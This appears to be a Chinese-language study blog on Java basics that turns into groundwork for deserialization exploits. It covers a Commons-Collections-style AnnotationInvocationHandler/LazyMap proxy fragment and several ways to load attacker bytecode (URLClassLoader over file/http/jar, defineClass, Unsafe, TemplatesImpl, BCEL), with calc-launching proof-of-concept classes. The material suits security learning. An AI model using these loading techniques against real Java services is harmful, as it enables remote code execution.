<h3 id="BufferReader"><a href="#BufferReader" class="headerlink" title="BufferReader"></a>BufferReader</h3><h2 id="转换流"><a href="#转换流" class="headerlink" title="转换流"></a>转换流</h2><p><code>InputStreamReader/OutputStreamWriter</code></p>
<ul>
<li>可将字节流变为转换流</li>
<li>可设置字符的编码方式</li>
</ul>
<div class="code-wrapper"><pre><code class="hljs reasonml">FileInputStream fs= <span class="hljs-keyword">new</span> <span class="hljs-constructor">FileInputStream(<span class="hljs-string">&quot;resource/test.txt&quot;</span>)</span>;
 InputStreamReader isr=<span class="hljs-keyword">new</span> <span class="hljs-constructor">InputStreamReader(<span class="hljs-params">fs</span>,<span class="hljs-string">&quot;utf-8&quot;</span>)</span>;<span class="hljs-comment">//传入字节流,转换流指定utf-8编码</span>
 <span class="hljs-comment">//读取文件</span>
 <span class="hljs-built_in">int</span> data=<span class="hljs-number">0</span>;
 <span class="hljs-keyword">while</span>((data=isr.read<span class="hljs-literal">()</span>)!=-<span class="hljs-number">1</span>)&#123;
     <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println((<span class="hljs-built_in">char</span>)data);
 &#125;
 isr.close<span class="hljs-literal">()</span>;
</code></pre></div>

<div class="code-wrapper"><pre><code class="hljs reasonml">FileOutputStream fo=<span class="hljs-keyword">new</span> <span class="hljs-constructor">FileOutputStream(<span class="hljs-string">&quot;fo.txt&quot;</span>)</span>;
OutputStreamWriter osw=<span class="hljs-keyword">new</span> <span class="hljs-constructor">OutputStreamWriter(<span class="hljs-params">fo</span>,<span class="hljs-string">&quot;GBK&quot;</span>)</span>; <span class="hljs-comment">//gbk编码写入</span>
<span class="hljs-keyword">for</span>(<span class="hljs-built_in">int</span> i=<span class="hljs-number">1</span>;i&lt;=<span class="hljs-number">10</span>;i++)&#123;
    osw.write(<span class="hljs-string">&quot;我是傻逼&quot;</span>);
    osw.flush<span class="hljs-literal">()</span>;
&#125;
osw.close<span class="hljs-literal">()</span>;</code></pre></div>

<h1 id="类"><a href="#类" class="headerlink" title="类"></a>类</h1><h2 id="Object类"><a href="#Object类" class="headerlink" title="Object类"></a>Object类</h2><h4 id="equals"><a href="#equals" class="headerlink" title="equals()"></a>equals()</h4><blockquote>
<p>&#x3D;&#x3D; 基础类型对比的是值是否相同，引用类型对比的是引用是否相同；<br>equals只是单单的比较值</p>
</blockquote>
<div class="code-wrapper"><pre><code class="hljs abnf">        String s1 <span class="hljs-operator">=</span> <span class="hljs-string">&quot;string&quot;</span><span class="hljs-comment">;</span>
        String s2 <span class="hljs-operator">=</span> <span class="hljs-string">&quot;string&quot;</span><span class="hljs-comment">;</span>
        String s3 <span class="hljs-operator">=</span> new String(<span class="hljs-string">&quot;string&quot;</span>)<span class="hljs-comment">;</span>
        System.out.println(s1<span class="hljs-operator">=</span><span class="hljs-operator">=</span>s2)<span class="hljs-comment">;</span>
        System.out.println(s1<span class="hljs-operator">=</span><span class="hljs-operator">=</span>s3)<span class="hljs-comment">;</span>
        System.out.println(s1.equals(s2))<span class="hljs-comment">;</span>
        System.out.println(s1.equals(s3))<span class="hljs-comment">;</span>
        
/*
true
false
true
true
*/</code></pre></div>

<h2 id="String类"><a href="#String类" class="headerlink" title="String类"></a>String类</h2><p>str.charAt(str.length()-1)       &#x2F;&#x2F;里面的数字相当于数组下标</p>
<div class="code-wrapper"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>charAt();返回对应下标的字符
<span class="hljs-regexp">//</span>toCharArray();返回字符串对应数组
<span class="hljs-regexp">//i</span>ndexOf(<span class="hljs-string">&#x27;asd&#x27;</span>);返回字符串首次出现位置
<span class="hljs-regexp">//</span>lastIndexOf(<span class="hljs-string">&#x27;asd&#x27;</span>);返回字符串最后一次出现的位置</code></pre></div>

<h1 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h1><h2 id="Collection接口"><a href="#Collection接口" class="headerlink" title="Collection接口"></a>Collection接口</h2><div class="code-wrapper"><pre><code class="hljs abnf">Collection col <span class="hljs-operator">=</span> new Arraylist()<span class="hljs-comment">;</span>
col.add(s1)<span class="hljs-comment">;</span>
col.add(s2)<span class="hljs-comment">;</span>
col.add(s3)<span class="hljs-comment">;</span>
Iterator it <span class="hljs-operator">=</span> col.iterator()<span class="hljs-comment">;  //迭代器</span>
while(it.hasNext())&#123;
	System.out.println(it.next())<span class="hljs-comment">;</span>
&#125;</code></pre></div>

<h2 id="泛型"><a href="#泛型" class="headerlink" title="泛型"></a>泛型</h2><p>实际上就是常见的<T></p>
<h2 id="Map集合"><a href="#Map集合" class="headerlink" title="Map集合"></a>Map集合</h2><div class="code-wrapper"><pre><code class="hljs arduino"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">String</span>[] args)</span> throws IOException </span>&#123;
        Map&lt;<span class="hljs-type">String</span>,<span class="hljs-type">String</span>&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-built_in">HashMap</span>&lt;<span class="hljs-type">String</span>, <span class="hljs-type">String</span>&gt;();
        map.<span class="hljs-built_in">put</span>(<span class="hljs-string">&quot;cn&quot;</span>,<span class="hljs-string">&quot;中国&quot;</span>);
        map.<span class="hljs-built_in">put</span>(<span class="hljs-string">&quot;usa&quot;</span>,<span class="hljs-string">&quot;美国&quot;</span>);
        map.<span class="hljs-built_in">put</span>(<span class="hljs-string">&quot;uk&quot;</span>,<span class="hljs-string">&quot;英国&quot;</span>);
        <span class="hljs-comment">//遍历map</span>
        Set&lt;<span class="hljs-type">String</span>&gt; keyset = map.<span class="hljs-built_in">keySet</span>();
        <span class="hljs-keyword">for</span> (<span class="hljs-type">String</span> s : map.<span class="hljs-built_in">keySet</span>()) &#123;
            System.out.<span class="hljs-built_in">println</span>(s+<span class="hljs-string">&quot;--------&quot;</span>+map.<span class="hljs-built_in">get</span>(s));
        &#125;
        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">&quot;----------entryset---------&quot;</span>);
        Set&lt;Map.Entry&lt;<span class="hljs-type">String</span>,<span class="hljs-type">String</span>&gt;&gt; entries = map.<span class="hljs-built_in">entrySet</span>();
        <span class="hljs-keyword">for</span> (Map.Entry&lt;<span class="hljs-type">String</span>, <span class="hljs-type">String</span>&gt; entry : entries) &#123;
            System.out.<span class="hljs-built_in">println</span>(entry.<span class="hljs-built_in">getKey</span>()+<span class="hljs-string">&quot;------&quot;</span>+entry.<span class="hljs-built_in">getValue</span>());
        &#125;
    &#125;
&#125;</code></pre></div>

<p>WOW，<code>entryset</code>，跟CC1的有一步骤有关</p>
<h2 id="注解与反射"><a href="#注解与反射" class="headerlink" title="注解与反射"></a>注解与反射</h2><div class="code-wrapper"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-params">className</span>, <span class="hljs-params">true</span>, <span class="hljs-params">currentLoader</span>)</span></code></pre></div>

<p>第⼆个参数表示是否初始化，在 forName 的时候，构造函数并不会执⾏，而是执⾏类初始化。他会执行<code>static&#123;&#125;</code>静态块里面的内容</p>
<p>newInstance()     对类进行实例化</p>
<p>但需要注意的是，invoke 方法第一个参数并不是固定的：</p>
<p><strong>如果调用这个方法是普通方法，第一个参数就是类对象；</strong></p>
<p><strong>如果调用这个方法是静态方法，第一个参数就是类；</strong></p>
<p>如果调用的方法是静态方法。那么invoke<code>方法传入的第一个参数永远为</code>null</p>
<h1 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h1><div class="code-wrapper"><pre><code class="hljs reasonml"><span class="hljs-keyword">new</span><span class="hljs-constructor">ProxyInstance(ClassLoader <span class="hljs-params">loader</span>, 类&lt;?&gt;[] <span class="hljs-params">interfaces</span>, InvocationHandler <span class="hljs-params">h</span>)</span> throws IllegalArgumentException</code></pre></div>

<ul>
<li><code>loader</code> – 类加载器来定义<strong>代理类</strong></li>
<li><code>interfaces</code> – 代理类实现的<strong>接口列表</strong></li>
<li><code>h</code> – 调度方法调用的调用<strong>处理函数</strong></li>
</ul>
<div class="code-wrapper"><pre><code class="hljs gradle">Hello hello = (Hello) Proxy.newProxyInstance(
            Hello.<span class="hljs-keyword">class</span>.getClassLoader(), <span class="hljs-comment">// 传入ClassLoader</span>
            <span class="hljs-keyword">new</span> <span class="hljs-keyword">Class</span>[] &#123; Hello.<span class="hljs-keyword">class</span> &#125;, <span class="hljs-comment">// 传入要实现的接口</span>
            handler); <span class="hljs-comment">// 传入处理调用方法的InvocationHandler</span></code></pre></div>

<div class="code-wrapper"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Proxy</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">ProxyInstance(<span class="hljs-params">ordinaryStudents</span>.<span class="hljs-params">getClass</span>()</span>.get<span class="hljs-constructor">ClassLoader()</span>, ordinaryStudents.get<span class="hljs-constructor">Class()</span>.get<span class="hljs-constructor">Interfaces()</span>, handler)</code></pre></div>

<p>通常是这两句，参数调整一下</p>
<div class="code-wrapper"><pre><code class="hljs reasonml">InvocationHandler instance = (InvocationHandler) constructor.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(Target.<span class="hljs-params">class</span>,<span class="hljs-params">lazymap</span>)</span>;
Map proxyInstance = (Map) <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Proxy</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">ProxyInstance(LazyMap.<span class="hljs-params">class</span>.<span class="hljs-params">getClassLoader</span>()</span>,<span class="hljs-keyword">new</span> Class<span class="hljs-literal">[]</span>&#123;<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Map</span>.</span></span><span class="hljs-keyword">class</span>&#125;,instance);</code></pre></div>



<div class="code-wrapper"><pre><code class="hljs reasonml">Class c = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>)</span>;

Constructor constructor = c.get<span class="hljs-constructor">DeclaredConstructor(Class.<span class="hljs-params">class</span>,Map.<span class="hljs-params">class</span>)</span>;

constructor.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;
InvocationHandler instance = (InvocationHandler) constructor.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(Target.<span class="hljs-params">class</span>,<span class="hljs-params">lazymap</span>)</span>;
Map proxyInstance = (Map) <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Proxy</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">ProxyInstance(LazyMap.<span class="hljs-params">class</span>.<span class="hljs-params">getClassLoader</span>()</span>,<span class="hljs-keyword">new</span> Class<span class="hljs-literal">[]</span>&#123;<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Map</span>.</span></span><span class="hljs-keyword">class</span>&#125;,instance);
Object o = constructor.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(Override.<span class="hljs-params">class</span>,<span class="hljs-params">proxyInstance</span>)</span>;</code></pre></div>

<h1 id="类加载"><a href="#类加载" class="headerlink" title="类加载"></a>类加载</h1><p>BootstrapClassLoader     ExtensionsClassLoader     AppClassLoader</p>
<h2 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h2><p>①：URL未以斜杠 &#x2F; 结尾，则认为是一个JAR文件，使用 <code>JarLoader</code> 来寻找类，即为在Jar包中寻找.class文件</p>
<p>②：URL以斜杠 &#x2F; 结尾，且协议名是 <code>file</code> ，则使用 <code>FileLoader</code> 来寻找类，即为在本地文件系统中寻找.class文件</p>
<p>③：URL以斜杠 &#x2F; 结尾，且协议名不是 <code>file</code> ，则使用最基础的 <code>Loader</code> 来寻找类。</p>
<div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.ctf.bcel;

<span class="hljs-keyword">import</span> java.io.IOException;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">calc</span> &#123;
    <span class="hljs-keyword">static</span>&#123;
        <span class="hljs-keyword">try</span> &#123;
            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);
        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;
            e.printStackTrace();
        &#125;
    &#125;
&#125;</code></pre></div>

<p>file:&#x2F;&#x2F;       路径为<code>.class</code>文件所在路径</p>
<div class="code-wrapper"><pre><code class="hljs swift"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BCELDemo</span> &#123;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> void main(<span class="hljs-type">String</span>[] args) <span class="hljs-keyword">throws</span> <span class="hljs-type">Exception</span> &#123;
        <span class="hljs-type">URLClassLoader</span> urlClassLoader <span class="hljs-operator">=</span> new <span class="hljs-type">URLClassLoader</span>(new <span class="hljs-type">URL</span>[]&#123;new <span class="hljs-type">URL</span>(<span class="hljs-string">&quot;file://C:<span class="hljs-subst">\\</span>Users<span class="hljs-subst">\\</span>86136<span class="hljs-subst">\\</span>Desktop<span class="hljs-subst">\\</span>rmi<span class="hljs-subst">\\</span>out<span class="hljs-subst">\\</span>production<span class="hljs-subst">\\</span>rmi<span class="hljs-subst">\\</span>com<span class="hljs-subst">\\</span>ctf<span class="hljs-subst">\\</span>bcel&quot;</span>)&#125;);
        urlClassLoader.loadClass(<span class="hljs-string">&quot;com.ctf.bcel.calc&quot;</span>).newInstance();
    &#125;     <span class="hljs-comment">//包名.类名</span>
&#125;</code></pre></div>

<p>http:&#x2F;&#x2F;     python起一个http服务</p>
<div class="code-wrapper"><pre><code class="hljs haxe"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BCELDemo</span> </span>&#123;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> void main(<span class="hljs-keyword">String</span>[] args) throws Exception &#123;
        URLClassLoader urlClassLoader = <span class="hljs-keyword">new</span> <span class="hljs-type">URLClassLoader</span>(<span class="hljs-keyword">new</span> <span class="hljs-type">URL</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-type">URL</span>(<span class="hljs-string">&quot;http://127.0.0.1:8000&quot;</span>)&#125;);
        urlClassLoader.loadClass(<span class="hljs-string">&quot;com.ctf.bcel.calc&quot;</span>).<span class="hljs-keyword">new</span><span class="hljs-type">Instance</span>();
    &#125;     <span class="hljs-comment">//包名.类名</span>
&#125;</code></pre></div>

<p>将我们之前的 class 文件打包一下，打包为 jar 文件。</p>
<div class="code-wrapper"><pre><code class="hljs mipsasm"><span class="hljs-keyword">jar </span>-cvf calc.<span class="hljs-keyword">jar </span>clac.class</code></pre></div>

<p>file + jar协议</p>
<div class="code-wrapper"><pre><code class="hljs haxe"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BCELDemo</span> </span>&#123;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> void main(<span class="hljs-keyword">String</span>[] args) throws Exception &#123;
        URLClassLoader urlClassLoader = <span class="hljs-keyword">new</span> <span class="hljs-type">URLClassLoader</span>(<span class="hljs-keyword">new</span> <span class="hljs-type">URL</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-type">URL</span>(<span class="hljs-string">&quot;jar:file:///E:\\Calc.jar!/&quot;</span>)&#125;);
        urlClassLoader.loadClass(<span class="hljs-string">&quot;com.ctf.bcel.calc&quot;</span>).<span class="hljs-keyword">new</span><span class="hljs-type">Instance</span>();
    &#125;     <span class="hljs-comment">//包名.类名</span>
&#125;</code></pre></div>

<p>http + jar协议</p>
<div class="code-wrapper"><pre><code class="hljs haxe"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BCELDemo</span> </span>&#123;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> void main(<span class="hljs-keyword">String</span>[] args) throws Exception &#123;
        URLClassLoader urlClassLoader = <span class="hljs-keyword">new</span> <span class="hljs-type">URLClassLoader</span>(<span class="hljs-keyword">new</span> <span class="hljs-type">URL</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-type">URL</span>(<span class="hljs-string">&quot;jar:http://127.0.0.1:9999/Calc.jar!/&quot;</span>)&#125;);
        urlClassLoader.loadClass(<span class="hljs-string">&quot;com.ctf.bcel.calc&quot;</span>).<span class="hljs-keyword">new</span><span class="hljs-type">Instance</span>();
    &#125;     <span class="hljs-comment">//包名.类名</span>
&#125;</code></pre></div>

<h2 id="加载字节码"><a href="#加载字节码" class="headerlink" title="加载字节码"></a>加载字节码</h2><h3 id="ClassLoader-defineClass"><a href="#ClassLoader-defineClass" class="headerlink" title="ClassLoader#defineClass"></a>ClassLoader#defineClass</h3><div class="code-wrapper"><pre><code class="hljs reasonml">define<span class="hljs-constructor">Class(String <span class="hljs-params">name</span>,<span class="hljs-params">byte</span>[] <span class="hljs-params">b</span>,<span class="hljs-params">int</span> <span class="hljs-params">off</span>,<span class="hljs-params">int</span> <span class="hljs-params">len</span>)</span>
<span class="hljs-comment">//name为类名，b为字节码数组，off为偏移量，len为字节码数组的长度。</span></code></pre></div>

<div class="code-wrapper"><pre><code class="hljs reasonml">public <span class="hljs-keyword">class</span> BCELDemo &#123;
    public static void main(String<span class="hljs-literal">[]</span> args) throws Exception &#123;
        ClassLoader systemClassLoader = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ClassLoader</span>.</span></span>get<span class="hljs-constructor">SystemClassLoader()</span>;
        Method <span class="hljs-keyword">method</span> = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ClassLoader</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">DeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, String.<span class="hljs-params">class</span>, <span class="hljs-params">byte</span>[].<span class="hljs-params">class</span>, <span class="hljs-params">int</span>.<span class="hljs-params">class</span>, <span class="hljs-params">int</span>.<span class="hljs-params">class</span>)</span>;
        <span class="hljs-keyword">method</span>.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;
        byte<span class="hljs-literal">[]</span> code = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Files</span>.</span></span>read<span class="hljs-constructor">AllBytes(Paths.<span class="hljs-params">get</span>(<span class="hljs-string">&quot;C:\\Users\\86136\\Desktop\\rmi\\out\\production\\rmi\\com\\ctf\\bcel\\calc.class&quot;</span>)</span>);
        Class c = (Class) <span class="hljs-keyword">method</span>.invoke(systemClassLoader,<span class="hljs-string">&quot;com.ctf.bcel.calc&quot;</span>,code,<span class="hljs-number">0</span>,code.length);
        c.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span>;

    &#125;
&#125;</code></pre></div>

<h3 id="Unsafe-的defineClass"><a href="#Unsafe-的defineClass" class="headerlink" title="Unsafe 的defineClass"></a>Unsafe 的defineClass</h3><div class="code-wrapper"><pre><code class="hljs wren"><span class="hljs-variable">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BCELDemo</span> &#123;
    <span class="hljs-variable">public</span> <span class="hljs-keyword">static</span> <span class="hljs-variable">void</span> <span class="hljs-title function_">main</span>(<span class="hljs-title class_">String</span>[] <span class="hljs-variable">args</span>) <span class="hljs-variable">throws</span> <span class="hljs-title class_">Exception</span> &#123;
        <span class="hljs-title class_">ClassLoader</span> classLoader <span class="hljs-operator">=</span> <span class="hljs-title class_">ClassLoader</span>.<span class="hljs-property">getSystemClassLoader</span>();
        <span class="hljs-title class_">Class</span><span class="hljs-operator">&lt;</span><span class="hljs-title class_">Unsafe</span><span class="hljs-operator">&gt;</span> <span class="hljs-variable">unsafeClass</span> <span class="hljs-operator">=</span> <span class="hljs-title class_">Unsafe</span>.<span class="hljs-property">class</span>;
        <span class="hljs-title class_">Field</span> <span class="hljs-variable">unsafeField</span> <span class="hljs-operator">=</span> <span class="hljs-variable">unsafeClass</span>.<span class="hljs-property">getDeclaredField</span>(<span class="hljs-string">&quot;theUnsafe&quot;</span>);
        <span class="hljs-variable">unsafeField</span>.<span class="hljs-property">setAccessible</span>(<span class="hljs-literal">true</span>);
        <span class="hljs-title class_">Unsafe</span> classUnsafe <span class="hljs-operator">=</span> (<span class="hljs-title class_">Unsafe</span>) <span class="hljs-variable">unsafeField</span>.<span class="hljs-property">get</span>(<span class="hljs-literal">null</span>);
        <span class="hljs-title class_">Method</span> <span class="hljs-variable">defineClassMethod</span> <span class="hljs-operator">=</span> <span class="hljs-variable">unsafeClass</span>.<span class="hljs-property">getMethod</span>(<span class="hljs-string">&quot;defineClass&quot;</span>, <span class="hljs-title class_">String</span>.<span class="hljs-property">class</span>, <span class="hljs-variable">byte</span>[].<span class="hljs-property">class</span>,
                int.<span class="hljs-property">class</span>, int.<span class="hljs-property">class</span>, <span class="hljs-title class_">ClassLoader</span>.<span class="hljs-property">class</span>, <span class="hljs-title class_">ProtectionDomain</span>.<span class="hljs-property">class</span>);
        <span class="hljs-variable">byte</span>[] <span class="hljs-variable">code</span> <span class="hljs-operator">=</span> <span class="hljs-title class_">Files</span>.<span class="hljs-property">readAllBytes</span>(<span class="hljs-title class_">Paths</span>.<span class="hljs-property">get</span>(<span class="hljs-string">&quot;C:<span class="hljs-char escape_">\\</span>Users<span class="hljs-char escape_">\\</span>86136<span class="hljs-char escape_">\\</span>Desktop<span class="hljs-char escape_">\\</span>rmi<span class="hljs-char escape_">\\</span>out<span class="hljs-char escape_">\\</span>production<span class="hljs-char escape_">\\</span>rmi<span class="hljs-char escape_">\\</span>com<span class="hljs-char escape_">\\</span>ctf<span class="hljs-char escape_">\\</span>bcel<span class="hljs-char escape_">\\</span>calc.class&quot;</span>));
        <span class="hljs-title class_">Class</span> <span class="hljs-variable">calc</span> <span class="hljs-operator">=</span> (<span class="hljs-title class_">Class</span>) <span class="hljs-variable">defineClassMethod</span>.<span class="hljs-property">invoke</span>(classUnsafe, <span class="hljs-string">&quot;com.ctf.bcel.calc&quot;</span>, <span class="hljs-variable">code</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">code</span>.<span class="hljs-property">length</span>, classLoader, <span class="hljs-literal">null</span>);
        <span class="hljs-variable">calc</span>.<span class="hljs-property">newInstance</span>();

    &#125;
&#125;</code></pre></div>

<h2 id="TemplatesImpl-加载字节码-！！！！"><a href="#TemplatesImpl-加载字节码-！！！！" class="headerlink" title="TemplatesImpl 加载字节码      ！！！！"></a>TemplatesImpl 加载字节码      ！！！！</h2><div class="code-wrapper"><pre><code class="hljs leaf">TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">getOutputProperties</span><span class="hljs-params">()</span></span> -&gt; TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">newTransformer</span><span class="hljs-params">()</span></span> -&gt;

TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">getTransletInstance</span><span class="hljs-params">()</span></span> -&gt; TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">defineTransletClasses</span><span class="hljs-params">()</span></span>

-&gt; TransletClassLoader<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">defineClass</span><span class="hljs-params">()</span></span></code></pre></div>

<p><code>TemplatesImpl#getOutputProperties()</code> <code>TemplatesImpl#newTransformer()</code></p>
<p>可以利用这两个去构造poc</p>
<p>首先先构造字节码，注意，这里的字节码必须继承<code>AbstractTranslet</code>，因为继承了这一抽象类，所以必须要重写一下里面的方法</p>
<div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.ctf.bcel;

<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;
<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;
<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
<span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
<span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;

<span class="hljs-keyword">import</span> java.io.IOException;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">calc</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">calc</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;
        <span class="hljs-built_in">super</span>();
        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);
    &#125;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;

    &#125;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;

    &#125;
&#125;</code></pre></div>



<div class="code-wrapper"><pre><code class="hljs reasonml">public <span class="hljs-keyword">class</span> TemplatesRce &#123;  
    public static void main(String<span class="hljs-literal">[]</span> args) throws Exception&#123;  
        byte<span class="hljs-literal">[]</span> code = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Files</span>.</span></span>read<span class="hljs-constructor">AllBytes(Paths.<span class="hljs-params">get</span>(<span class="hljs-string">&quot;E:\\JavaClass\\TemplatesBytes.class&quot;</span>)</span>);  
 TemplatesImpl templates = <span class="hljs-keyword">new</span> <span class="hljs-constructor">TemplatesImpl()</span>;  
 set<span class="hljs-constructor">FieldValue(<span class="hljs-params">templates</span>, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;Calc&quot;</span>)</span>;  
 set<span class="hljs-constructor">FieldValue(<span class="hljs-params">templates</span>, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-params">new</span> <span class="hljs-params">byte</span>[][] &#123;<span class="hljs-params">code</span>&#125;)</span>;  
 set<span class="hljs-constructor">FieldValue(<span class="hljs-params">templates</span>, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-params">new</span> TransformerFactoryImpl()</span>);  
 templates.<span class="hljs-keyword">new</span><span class="hljs-constructor">Transformer()</span>;  
 &#125;  
    public static void set<span class="hljs-constructor">FieldValue(Object <span class="hljs-params">obj</span>, String <span class="hljs-params">fieldName</span>, Object <span class="hljs-params">value</span>)</span> throws Exception&#123;  
        Field field = obj.get<span class="hljs-constructor">Class()</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-params">fieldName</span>)</span>;  
 field.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;  
 field.set(obj, value);  
 &#125;  
&#125;</code></pre></div>

<h2 id="BCEL-加载字节码"><a href="#BCEL-加载字节码" class="headerlink" title="BCEL 加载字节码"></a>BCEL 加载字节码</h2><p>通过 BCEL 提供的两个类 <code>Repository</code> 和 <code>Utility</code> 来利用： <code>Repository</code> 用于将一个Java Class 先转换成原生字节码，当然这里也可以直接使用javac命令来编译 java 文件生成字节码； <code>Utility</code> 用于将原生的字节码转换成BCEL格式的字节码：</p>
<div class="code-wrapper"><pre><code class="hljs reasonml">JavaClass cls = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Repository</span>.</span></span>lookup<span class="hljs-constructor">Class(Evil.<span class="hljs-params">class</span>)</span>;
String code = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Utility</span>.</span></span>encode(cls.get<span class="hljs-constructor">Bytes()</span>, <span class="hljs-literal">true</span>);
<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(<span class="hljs-string">&quot;$$BCEL$$&quot;</span>+code);

<span class="hljs-keyword">new</span> <span class="hljs-constructor">ClassLoader()</span>.load<span class="hljs-constructor">Class(<span class="hljs-string">&quot;$$BCEL$$&quot;</span> + <span class="hljs-params">code</span>)</span>.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span>;</code></pre></div>

<div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;  
   
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Calc</span> &#123;  
    <span class="hljs-keyword">static</span> &#123;  
        <span class="hljs-keyword">try</span> &#123;  
            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);  
 		&#125; <span class="hljs-keyword">catch</span> (IOException e)&#123;  
            e.printStackTrace();  
 		&#125;  
    &#125;  
&#125;</code></pre></div>

<h2 id="读p神文章"><a href="#读p神文章" class="headerlink" title="读p神文章"></a>读p神文章</h2><p>编译.xsl生成.class</p>
<p><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>，它在<code>defineClass</code>中需要的字节码所对应的基类，就是这里的<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code></p>
<p>XSLT在使用时会先编译成Java字节码，这也就是为什么<code>TemplatesImpl</code>会使用<code>defineClass</code>的原因</p>
